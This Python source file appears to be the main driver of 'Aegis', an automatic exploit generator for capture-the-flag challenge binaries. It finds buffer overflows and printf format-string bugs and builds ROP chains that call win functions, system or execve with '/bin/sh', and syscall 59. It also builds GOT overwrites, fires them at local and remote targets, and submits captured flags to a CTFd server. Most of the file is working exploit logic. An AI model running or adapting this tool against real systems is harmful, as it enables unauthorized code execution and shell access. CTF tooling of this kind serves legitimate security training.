#!/usr/bin/env python3
import logging
import argparse
import os
import json
import requests

from pwn import *
from rage.rage import rAEG
from rage.machine import Machine
from rage.against import Against
from rage.log import aegis_log

class Aegis:
    """Class that does the control flow for analysis and execution."""

    def __init__(self, binary, libc, ip, port, ctfd, flag_format, id):
        """Initiaize important variables for the binary."""
        self.binary = os.path.abspath(binary)
        self.elf = ELF(binary)
        self.rop = ROP(self.elf)

        self.libc = ELF(libc) if libc != None else self.elf.libc

        self.ip = ip
        self.port = port
        self.has_format = False

        self.access_token = os.environ.get("CTFD_TOK")
        self.headers = {
            "Authorization": f"Token {self.access_token}",
            "Content-Type" : "application/json",
        }

        self.ctfd = ctfd
        self.chal_id = id
        self.flag_format = flag_format if flag_format is not None else "flag"

        self.symbol = rAEG(self.binary)
        self.machine = Machine(self.binary)
        
        self.static_analysis() 
        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port, self.flag_format)

        self.symbolic_padding = None
        self.padding = None
        self.failed = False

        self.got_targets = None

    def static_analysis(self):
        """Set variables from the output of the static analysis."""
        self.machine.check_mitigations()
        self.machine.check_vulnerable_copy()
        self.machine.check_vulnerable_input()
        printf_addrs = self.machine.check_vulnerable_printf()

        if len(printf_addrs) > 0:
            self.has_format = True 
            self.got_targets = self.machine.find_target_got_entries(printf_addrs[0])

    def symbolic_analysis(self):
        """Set variables from the output of the symbolic analysis."""
        self.symbol.stack_smash()
        self.symbolic_padding = self.symbol.symbolic_padding
        
        if not self.has_format:
            self.has_format = self.symbol.has_format 

        if self.has_format == True:
            aegis_log.info(f"Found printf format string vulnerability")

    def setup_exploit(self):
        """Choose which exploit to do for the binary."""
        
        self.against.chain = b""

        win_gadget = self.machine.find_win_gadget()
        function = self.machine.find_functions(["win", "system", "execve", "syscall"])
        string = self.machine.find_string_address()
        writeable = self.machine.find_writeable_address()

        function = function[0] if len(function) > 0 else None
        self.against.padding = self.symbolic_padding if self.symbolic_padding != None else b"A" * self.machine.padding_size

        if len(self.against.padding) == 0:
            aegis_log.warning(f"Could not find buffer overflow")

            if self.has_format == True:
                self.against.format_leak("")

                if self.against.flag == None:
                    if "pwnme" in self.elf.sym.keys(): 
                        self.against.format_write(1337, self.elf.sym["pwnme"])
                        self.exploit()
                    elif function == "win":
                        got_addr = self.elf.got[self.got_targets[-1]]
                        self.against.format_write(self.elf.sym["win"], got_addr)
                        self.exploit()
                    elif win_gadget:
                        got_addr = self.elf.got[self.got_targets[-1]]
                        self.against.format_write(win_gadget, got_addr)
                        self.exploit()
                else:
                    aegis_log.info(f"Found flag through stack leak: {self.against.flag}\nFinding remote flag")
                    self.against.format_leak("REMOTE")

                    if self.against.remote_flag != None:
                        aegis_log.info(f"Found flag through stack leak: {self.against.remote_flag}")
                        self.send_flag(self.against.remote_flag)

        else: 

            if win_gadget:
                aegis_log.debug(f"Setting up return to win with gadget")
                self.against.chain += p64(win_gadget)
                self.against.exploit = self.against.padding + self.against.chain

            elif function == "win":
                aegis_log.debug(f"setting up return to win with function")
                self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
                self.against.exploit = self.against.padding + self.against.chain

            elif function == "system":
                aegis_log.debug(f"Setting up return to system")
                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string])

                self.against.exploit = self.against.padding + self.against.chain
            elif function == "execve":
                aegis_log.debug(f"Setting up return to execve")
                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
                self.against.exploit = self.against.padding + self.against.chain
            elif function == "syscall":
                aegis_log.debug(f"Setting up return to syscall")

                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [59, writeable, 0, 0])
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
                self.against.exploit = self.against.padding + self.against.chain
            else:
                if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.debug(f"Setting up return to puts")
                    self.against.chain = self.against.rop_ret2puts()
                elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.debug(f"Setting up return to dlresolve")
                    self.against.chain = self.against.rop_chain_dlresolve()
            self.exploit()
            

    def write_solve_script(self):
        """Write the solve to a script for writeup purposes."""


    def send_flag(self, flag):
        """Sends the flag to ctfd service"""
        challenge_url = f"{self.ctfd}/api/v1/challenges/attempt"
        data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
        response = requests.post(challenge_url, headers=self.headers, data=data)
        json_data = response.json()
        message = json_data["data"]["message"]

        aegis_log.critical(f"Response from remote server {message} for {flag}")


    def exploit(self):
        """Create and run exploit using Against module."""
        aegis_log.debug(f"Setting up exploit")
        chain_len = len(self.against.chain) if self.against.chain is not None else 0
        format_len = len(self.against.format_exploit) if self.against.format_exploit is not None else 0

        if chain_len > 0:
            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
        else:
            aegis_log.debug(f"Sending format string payload {self.against.format_exploit} {format_len % 16}")

        option = "GDB" if args.GDB else ""

        self.against.process = self.against.start(option)
        self.against.send_exploit()
        if self.against.verify_flag() == False:
            aegis_log.debug(f"Adding ret to chain")
            ret = p64(self.rop.find_gadget(["ret"])[0])
            chain_len = len(self.against.chain)
            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
            self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]

            self.against.process = self.against.start(option)
            self.against.send_exploit()
            self.against.verify_flag()

            if self.against.flag != None:
                    self.against.process = self.against.start("REMOTE")
                    self.against.send_exploit()                    
                    aegis_log.debug(f"Sent exploit to remote at {self.ip}")
                    if self.against.verify_flag() == True:
                       self.send_flag(self.against.flag) 
                                    
        else:
            if self.against.flag != None:
                    self.against.process = self.against.start("REMOTE")
                    self.against.send_exploit()
                    if self.against.verify_flag() == True:
                       self.send_flag(self.against.flag) 
                    aegis_log.debug(f"Sent exploit to remote at {self.ip}")

 
def print_title():

    aegis_title = """
  ▄████████    ▄████████    ▄██████▄   ▄█     ▄████████
  ███    ███   ███    ███   ███    ███ ███    ███    ███
  ███    ███   ███    █▀    ███    █▀  ███▌   ███    █▀
  ███    ███  ▄███▄▄▄      ▄███        ███▌   ███
▀███████████ ▀▀███▀▀▀     ▀▀███ ████▄  ███▌ ▀███████████
  ███    ███   ███    █▄    ███    ███ ███           ███
  ███    ███   ███    ███   ███    ███ ███     ▄█    ███
  ███    █▀    ██████████   ████████▀  █▀    ▄████████▀    
    """


    shield_1 = """
                  ██                                          
              ████░░████                                      
          ████░░░░░░░░░░████                                  
      ████░░░░░░░░░░░░░░░░░░████                              
██████░░░░▒▒▒▒░░░░░░░░░░▓▓▓▓░░░░██████                        
██░░░░░░▓▓▒▒▓▓▓▓░░░░░░▓▓▓▓▒▒▓▓░░░░░░██                        
██░░░░░░░░▒▒░░▓▓▓▓▒▒▓▓▓▓░░▓▓░░░░░░░░██                        
██░░░░░░▒▒▓▓░░▒▒▒▒  ▓▓▓▓░░▓▓▒▒░░░░░░██                        
██░░▓▓▓▓▓▓░░▒▒▒▒      ▓▓▓▓░░▓▓▓▓▓▓░░██                        
  ██░░▓▓░░▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓░░▓▓░░██                          
  ██░░▒▒▒▒▓▓      ▒▒      ▒▒▒▒▓▓░░██                          
  ██░░▓▓▓▓▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓░░██                          
  ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                          
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░██                            
      ██░░▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒░░██                              
      ██░░▓▓▓▓▒▒▓▓▒▒▒▒▒▒▓▓▓▓░░██                              
        ██░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓░░██                                
          ██░░▓▓░░░░░░▓▓░░██                                  
            ██░░░░░░░░░░██                                    
              ████░░████                                      
                  ██                                          

    """

    pillar = """      
    ░░▒▒▒▒░░▒▒░░░░░░     
  ░░░░░░░░░░░░░░░░░░░░   
  ░░░░░░░░░░▒▒░░░░░░     
    ░░▒▒▒▒▒▒░░░░░░░░     
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░▒▒░░       
      ▒▒▒▒▒▒░░▒▒░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
    ▒▒▒▒▒▒░░░░░░░░░░     
    ▒▒▒▒░░░░░░░░░░░░     
    ▒▒▒▒▒▒▒▒░░░░░░░░   
    """
    #print(aegis_title)
    #print(pillar)

if __name__ == "__main__":
    logging.getLogger("angr").setLevel(logging.CRITICAL)
    logging.getLogger("os").setLevel(logging.CRITICAL)
    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
    logging.getLogger("aegis_log").setLevel(logging.DEBUG)
    #logging.getLogger("aegis_log").setLevel(logging.CRITICAL)

    parser = argparse.ArgumentParser( 
        prog = "Aegis", 
        description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
    )

    parser.add_argument("-bin", metavar="binary", type=str, help="The binary that is to be exploited", default=None)
    parser.add_argument("-libc", metavar="libc", type=str, help="The libc shared library object linked to the binary", default=None)
    parser.add_argument("-ip", metavar="ip", type=str, help="The ip address of the remote challenge or connection info", default=None)
    parser.add_argument("-port", metavar="port", type=str, help="The port of the remote challenge", default=None)
    parser.add_argument("-login", metavar="login", type=str, help="Your login to your ctfd account", default=None)
    parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
    parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)
    parser.add_argument("-id", metavar="challengeid", type=str, help="The ctfd challenge id", default=None)
    

    arguments = parser.parse_args()
    print_title()

    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, None, arguments.id)
    aeg.static_analysis()
    aeg.symbolic_analysis()
    aeg.setup_exploit()
